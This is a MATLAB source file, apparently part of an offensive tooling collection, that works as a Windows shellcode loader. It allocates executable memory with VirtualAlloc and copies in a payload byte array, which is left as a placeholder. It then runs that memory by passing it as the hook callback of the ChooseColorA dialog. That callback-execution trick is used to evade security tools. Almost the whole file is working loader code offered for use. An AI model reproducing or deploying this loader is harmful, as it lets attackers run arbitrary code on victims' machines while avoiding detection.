% Wra7h/FlavorTown
% MATLAB version: R2023a
% Tested on Win10 x64

if not(libisloaded('kernel32'))
    loadlibrary('kernel32.dll', @kernel32proto);
end

if not(libisloaded('Comdlg32'))
    loadlibrary('Comdlg32.dll', @Comdlg32proto);
end

if not(libisloaded('msvcrt'))
    loadlibrary('msvcrt.dll', @msvcrtproto);
end

%payloadexample = uint8([86, 72, 137, 230,...]);
payload = uint8([PAYLOAD HERE]);
cbPayload = length(payload);

%VirtualAlloc
allocationType = bitxor(hex2dec('00001000'), hex2dec('00002000'));
protection = hex2dec('00000040');
hAlloc = calllib('kernel32', 'VirtualAlloc', [], cbPayload, allocationType, protection);

%Copy payload to RWX memory region
calllib('msvcrt', 'memcpy', hAlloc, payload, int64(cbPayload));

%Execute
%https://learn.microsoft.com/en-us/windows/win32/api/commdlg/ns-commdlg-choosecolora-r1
SCHOOSECOLOR = struct(...
    'lStructSize', uint32(0), ...   % The size of the structure
    'hwndOwner', uint64(0), ...     % Handle to the owner window
    'hInstance', uint64(0), ...     % Handle to the instance
    'rgbResult', uint32(0), ...     % Initial color selection
    'lpCustColors', uint64(0), ...  % Pointer to an array of custom colors
    'Flags', uint32(0), ...         % Flags specifying options
    'lCustData', uint64(0), ...     % Custom data for hook
    'lpfnHook', uint64(0), ...      % Pointer to hook function
    'lpTemplateName', '', ...       % Custom template name
    'lpEditInfo', uint32(0) ...     % Undocumented
);

% Set the structure size and hook values
SCHOOSECOLOR.lStructSize = uint32(72);
SCHOOSECOLOR.Flags = uint32(0x10); % Enable Hook
SCHOOSECOLOR.lpfnHook = uint64(hAlloc);

LSChooseColor = libstruct('CHOOSECOLOR', SCHOOSECOLOR);
pCC = libpointer('voidPtr', LSChooseColor);

calllib('Comdlg32', 'ChooseColorA', pCC);

%Cleanup loaded libraries
if libisloaded('kernel32')
    unloadlibrary('kernel32');
end

if libisloaded('Comdlg32')
    unloadlibrary('Comdlg32');
end

if libisloaded('msvcrt')
    unloadlibrary('msvcrt');
end

function [fcns, structs, enuminfo] = kernel32proto
    fcns=[]; structs=[]; enuminfo=[]; fcns.alias=[];

    % Prototype for VirtualAlloc
    fcns.name{1} = 'VirtualAlloc';
    fcns.calltype{1} = 'cdecl';
    fcns.LHS{1} = 'int64'; 
    fcns.RHS{1} = {'int64Ptr', 'int64', 'uint32', 'uint32'};
end

function [fcns,structs,enuminfo] = Comdlg32proto
    fcns=[]; structs=[]; enuminfo=[]; fcns.alias={};
    
    structs.CHOOSECOLOR.members = struct( ...
        'lStructSize', 'uint32',...
        'hwndOwner', 'uint64',...
        'hInstance', 'uint64',...
        'rgbResult', 'uint32',...
        'lpCustColors', 'uint64',...
        'Flags', 'uint32',... 
        'lCustData','uint64',...
        'lpfnHook','uint64',...
        'lpTemplateName', 'string',...
        'lpEditInfo','uint32' ...
        );    
    
    % Prototype for ChooseColorA
    fcns.name{1} = 'ChooseColorA';
    fcns.calltype{1} = 'cdecl';
    fcns.LHS{1} = 'voidPtr';
    fcns.RHS{1} = {'voidPtr'};

end

function [fcns,structs,enuminfo] = msvcrtproto
    fcns=[]; structs=[]; enuminfo=[]; fcns.alias={};
    fcns.name{1} = 'memcpy';
    fcns.calltype{1} = 'cdecl';
    fcns.LHS{1} = 'voidPtr'; 
    fcns.RHS{1} = {'int64', 'uint8Ptr', 'int64'};
end